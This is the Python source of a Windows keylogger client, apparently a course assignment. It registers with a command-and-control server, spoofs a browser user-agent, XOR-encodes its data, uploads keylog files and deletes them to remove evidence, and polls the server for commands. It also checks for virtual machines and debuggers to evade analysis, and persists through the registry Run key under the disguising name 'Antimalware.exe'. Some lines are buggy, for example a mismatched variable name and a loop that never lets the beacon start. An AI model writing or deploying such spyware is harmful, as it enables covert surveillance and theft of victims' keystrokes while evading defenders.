import os, subprocess
from pathlib import Path
import requests
import glob
import platform, random
import time
import threading
import sys
import ctypes, winreg
import urllib3
urllib3.disable_warnings()

# Flask server URL
server_url = "https://127.0.0.1:5000"

# Get OS name and version
os_name = platform.system()
os_version = platform.release()
random_number = random.randint(1000, 9999)
# Create a unique id based on the OS name and version
unique_id = f"{os_name}_{os_version}_{random_number}"
##############################################
#
#   COMPLETION 50% overall - Block VM functionality
#
#   Within this function, we check multiple system activity.
#   The below 2 function cover the following blocking tasks:
#   - [5%] Block dissasembly such as IDA Pro
#   - [5%] Block debugger actions
#   - [5%] Don't run execution if VM has been detected
#   - [5%] Run on startup
#
##############################################
def detect_vm():
    # Check if unpacked on vm
    if os.path.exists('C:\\Windows\\System32\\drivers\\VBoxMouse.sys'):
        return True
    # Check for vmware tools
    if os.path.exists('C:\\Program Files\\VMware\\VMware Tools\\'):
        return True
    # Check MAC address for common vendors
    mac_address = subprocess.check_output("getmac")
    mac_address = mac_address.decode('utf-8')
    vm_vendors = ['00:05:69', '00:0C:29', '00:1C:14', '00:50:56', '08:00:27']
    if any(vendor in mac_address for vendor in vm_vendors):
        return True
    return False

def check_debugger():
    debugger = ctypes.windll.kernel32.IsDebuggerPresent()
    if debugger:
        print("Debugger detected, exiting...")
        sys.exit(0)
    return debugger

def check_if_debugged():
    from ctypes import windll, byref, Structure, c_int
    class PROCESS_INFORMATION(Structure):
        _fields_ = [("BeingDebugged", c_int)]
    process_info = PROCESS_INFORMATION()
    windll.kernel32.GetProcessInformation(-1, byref(process_info))
    return process_info.BeingDebugged

def add_startup(filepath):
    # Create/open registry key
    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, "Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_ALL_ACCESS)
    winreg.SetValueEx(key, 'Antimalware.exe', 0, winreg.REG_SZ, file_path)
    winreg.CloseKey(key)

if check_debugger() or check_if_debugged():
    print("Debugger detected, exiting")
    sys.exit(0)

if detect_vm():
    print("Virtual machine detected, exiting...")
    sys.exit(0)
##############################################
#
#   Data encoding [5%] - Client side
#
#   Within this method is a simple encoding function which preassignes
#   one-byte key to the unique identifiers and log data, this function 
#   is called when the identifier has been assigned to the client and when
#   sending keylog data to server.
#
##############################################
KEY = 0x29
def xor_encryption(input, key = KEY):
    return "".join(chr(ord(c) ^ key) for c in input)

##############################################
#
#   Command and control architecture [10%]
#
#   Within this method, we have a simple registering function which
#   assigns the client OS with a unique ID, based from their OS type.
#   Once the client has been assigned, the registering data is sent 
#   then to server.
#   COMPLETION TASK
#   - [5%] "From the collected packet traces, identify HTTP artifacts that might suggest that it is not an actual browser but malware communicating with command-and-control server (so it can develop network signatures to block its traffic at the network gateway). "
#   Make sure packets appear as usual, by including a useragent within paxket header data.
#
##############################################
def register_client(unique_id, host_info):
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3',
    }
    data = {
        "unique_id": xor_encryption(unique_id),
        "host_info": xor_encryption(host_info)
    }
    if detect_vm():
        print("Virtual machine detected, exiting...")
        sys.exit(0)

    # send a POST request to the /register route on the server
    response = requests.post(f"{server_url}/register", data = data, headers = headers, verify=False)
    print(response.text)

##############################################
#
#   Exfiltration [5%]
#
#   Within this function, We save the gathered keylog data into the downloads folder,
#   sends to server and checks the file has been succewfully uploaded before removing
#   it from the clients OS   
#
#   The below function also contributes to this task from Completion:
#   Once keylog file has been sucecsfully uploaded to the server, the file
#   removes itself from the OS. This also removes from recycle bin, so unable 
#   to retrieve file from client computer.
#
##############################################
def send_files(file_path):
    # get a list of all files in the directory
    all_files = glob.glob(os.path.join(Path.home(), "Downloads\\logs", '*.txt'))
    for file in all_files:
        with open(file, 'r') as f:
            file_content = xor_encryption(f.read())
        data = {
            "unique_id": xor_encryption(unique_id),
            "keylog": file_content
        }
        # send a POST request to the /upload route on the server
        response = requests.post(f"{server_url}/upload", data = data, verify = False)
        # print the server's response
        print(response.text)
        # COMPLETION - REMOVE KEYLOG FILE EVIDENCE
        if response.text == "Keylog uploaded successfully.":
            try:
                os.remove(file)
                print(f"Deleted file {file}")
            except OSError as e:
                print("Error: %s : %s" % (file, e.strerror))

##############################################
#
#   Command execution [5%] - Client side
#
#   Within this function, we check the server for commands every 10 seconds
#   and loop through until it gets a hit by its corresponding string value 
#   before executing.
#
#   COMPLETION TASK
#   - [5%] Remove all evidence of keylogged file
#
##############################################
def check_commands():
    while True:
        response = requests.get(f"{server_url}/get_commands", params={'uid': unique_id}, verify = False)
        command = response.text
        # Get the specified amount of minutes and sleep
        if command.startswith('sleep'):
            time.sleep(60)
        # Terminate delilah
        elif command == 'shutdown':
            os._exit(0)
        # Delete all generated log data
        elif command == 'delete':
            for file in glob.glob(os.path.join(Path.home(), "Downloads\\logs", '*.txt')):
                try:
                    os.remove(file)
                    print(f"Deleted file {file}")
                except OSError as e:
                    print("Error: %s : %s" % (file, e.strerror))
        # Check server for commands every 10 seconds
        time.sleep(10)

def beacon(unique_id):
    while True:
        # Signal checking by the specified client id
        data = {
            "unique_id": unique_id,
        }
        response = requests.post(f"{server_url}/beacon", data = data, verify = False)
        print(response.text)
        # Check every 60 seconds
        time.sleep(30)

# call the function to register the client
register_client(unique_id, "Client Host Info")
file_path = os.path.join(Path.home(), "Downloads\\logs", "output.txt")
send_files(file_path)
check_commands()
beacon_thread = threading.Thread(target=beacon, args=(unique_id,))
beacon_thread.start()
# Call the function
add_startup(r"C:\Downloads\Antimalware.py")
